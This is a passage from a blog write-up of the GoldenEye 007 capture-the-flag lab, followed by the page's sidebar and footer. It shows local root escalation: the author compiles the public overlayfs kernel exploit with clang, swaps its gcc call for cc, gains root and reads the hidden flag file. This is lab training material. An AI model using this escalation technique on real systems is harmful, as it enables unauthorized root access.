+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'>uname -a
+</span><span class='line'>Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I used the <a href="https://www.exploit-db.com/exploits/37292">overlayfs</a> exploit. There was no GCC on the box, but remember that webpage that mentioned clang. I compiled the exploit with clang: <code>clang 37292.c</code>. There were 5 warnings generated, but an executable a.out was generated. However, it didn&rsquo;t give me a root shell. When I looked through the exploit source code, I found a gcc reference:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">lib</span> <span class="o">=</span> <span class="n">system</span><span class="p">(</span><span class="s">&quot;gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w&quot;</span><span class="p">);</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Replacing gcc with cc (the default compiler) in this line and recompiling the code worked and I got root. Then I found the secret codes inside a hidden file in /root:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp"># cat /root/.flag.txt</span>
+</span><span class='line'><span class="n">cat</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="p">.</span><span class="n">flag</span><span class="p">.</span><span class="n">txt</span>
+</span><span class='line'><span class="n">Alec</span> <span class="n">told</span> <span class="n">me</span> <span class="n">to</span> <span class="n">place</span> <span class="n">the</span> <span class="n">codes</span> <span class="n">here</span><span class="o">:</span>
+</span><span class='line'>
+</span><span class='line'><span class="mf">568628e0</span><span class="n">d993b1973adc718237da6e93</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">If</span> <span class="n">you</span> <span class="n">captured</span> <span class="n">this</span> <span class="n">make</span> <span class="n">sure</span> <span class="n">to</span> <span class="n">go</span> <span class="n">here</span><span class="p">.....</span>
+</span><span class='line'><span class="o">/</span><span class="mo">006</span><span class="o">-</span><span class="n">final</span><span class="o">/</span><span class="n">xvf7</span><span class="o">-</span><span class="n">flag</span><span class="o">/</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Visit that path on the web server and mission accomplished!</p>
+
+<p><img class="center" src="/images/pentest/goldeneye/flag.png" title="flag" alt="flag"></p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'> <span class="n">____________________________________</span>
+</span><span class='line'><span class="o">/</span> <span class="n">Excellent</span> <span class="n">time</span> <span class="n">to</span> <span class="n">become</span> <span class="n">a</span> <span class="n">missing</span> \
+</span><span class='line'><span class="err">\</span> <span class="n">person</span><span class="p">.</span>                            <span class="o">/</span>
+</span><span class='line'> <span class="o">------------------------------------</span>
+</span><span class='line'>        <span class="err">\</span>   <span class="o">^</span><span class="n">__</span><span class="o">^</span>
+</span><span class='line'>         <span class="err">\</span>  <span class="p">(</span><span class="n">oo</span><span class="p">)</span><span class="err">\</span><span class="n">_______</span>
+</span><span class='line'>            <span class="p">(</span><span class="n">__</span><span class="p">)</span><span class="err">\</span>       <span class="p">)</span><span class="err">\</span><span class="o">/</span>\
+</span><span class='line'>                <span class="o">||----</span><span class="n">w</span> <span class="o">|</span>
+</span><span class='line'>                <span class="o">||</span>     <span class="o">||</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">chousensha</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2019-04-02T21:57:39+03:00" pubdate data-updated="true">Apr 2<span>nd</span>, 2019</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/penetration-testing/'>penetration testing</a>, <a class='category' href='/blog/categories/writeups/'>writeups</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://chousensha.github.io/blog/2019/04/02/goldeneye-007/" data-via="chous3nsha" data-counturl="http://chousensha.github.io/blog/2019/04/02/goldeneye-007/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2018/12/27/my-oswp-review/" title="Previous Post: My OSWP review">&laquo; My OSWP review</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>whoami</h1>
+  <p>switch (interests){<br>
+ case INFORMATION SECURITY:<br>
+Mostly offensive security, but trying to be well-rounded in everything;<br>
+case PYTHON:<br>
+Mainly security and sysadmin related scripting;<br>
+case LINUX:<br>
+Greetings from /dev/null;<br>
+case JAPANESE:<br>
+Language, anime, samurai;<br>
+case MARTIAL ARTS:<br>
+If it's fighting I like it;<br>
+case MILITARY SCIENCE:<br>
+Ancient, medieval, modern;<br>
+default: GAMING;}</p>
+</section>
+<section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2019/04/02/goldeneye-007/">GoldenEye 007</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2018/12/27/my-oswp-review/">My OSWP review</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2018/11/30/getting-in-the-w1r3s/">Getting in the W1R3S</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2018/11/16/hackfest-2016-sedna/">Hackfest 2016: Sedna</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2018/11/11/social-engineering-expert-course-review/">Social Engineering Expert course review</a>
+      </li>
+    
+  </ul>
+</section>
+
+<section>
+  <h1>GitHub Repos</h1>
+  <ul id="gh_repos">
+    <li class="loading">Status updating...</li>
+  </ul>
+  
+  <a href="https://github.com/chousensha">@chousensha</a> on GitHub
+  
+  <script type="text/javascript">
+    $(document).ready(function(){
+        if (!window.jXHR){
+            var jxhr = document.createElement('script');
+            jxhr.type = 'text/javascript';
+            jxhr.src = '/javascripts/libs/jXHR.js';
+            var s = document.getElementsByTagName('script')[0];
+            s.parentNode.insertBefore(jxhr, s);
+        }
+
+        github.showRepos({
+            user: 'chousensha',
+            count: 5,
+            skip_forks: true,
+	    skip_repos: [ "chousensha.github.io" ],
+            target: '#gh_repos'
+        });
+    });
+  </script>
+  <script src="/javascripts/github.js" type="text/javascript"> </script>
+</section>
+
+
+<section>
+  <h1>Latest Tweets</h1>
+  <ul id="tweets">
+    <a class="twitter-timeline" data-dnt="true" href="https://twitter.com/chous3nsha" data-widget-id="733738822597550081" data-link-color="#1863a1" data-tweet-limit="3" data-chrome="noheader nofooter transparent noscrollbar">Tweets by @chous3nsha</a>
+    <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
+  </ul>
+  
+    <a href="http://twitter.com/chous3nsha" class="twitter-follow-button" data-show-count="true">Follow @chous3nsha</a>
+  
+</section>
+
+<section>
+  <h1>Blogroll</h1>
+  <p><a href="https://blog.g0tmi1k.com/">g0tmi1k</a></p>
+  <p><a href="http://redteamjournal.com/">Red Team Journal</a></p>
+  <p><a href="https://www.corelan.be/">Corelan Team</a></p>
+  <p><a href="http://www.madirish.net/">Mad Irish</a></p>
+  <p><a href="http://redteams.net/blog/">redteams.net</a></p>
+  <p><a href="https://www.mattandreko.com/">MattAndreko.com</a></p>
+  <p><a href="http://blog.portswigger.net/">Portswigger Web Security</a></p>
+  <p><a href="http://blog.cobaltstrike.com/">Cobalt Strike blog</a></p>
+  <p><a href="https://highon.coffee/blog/">HighOn.Coffee</a></p>
+  <p><a href="https://pentestlab.blog/">Penetration Testing Lab</a></p
+</section>
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2019 - chousensha -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'coredumpoverflow';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://chousensha.github.io/blog/2019/04/02/goldeneye-007/';
+        var disqus_url = 'http://chousensha.github.io/blog/2019/04/02/goldeneye-007/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
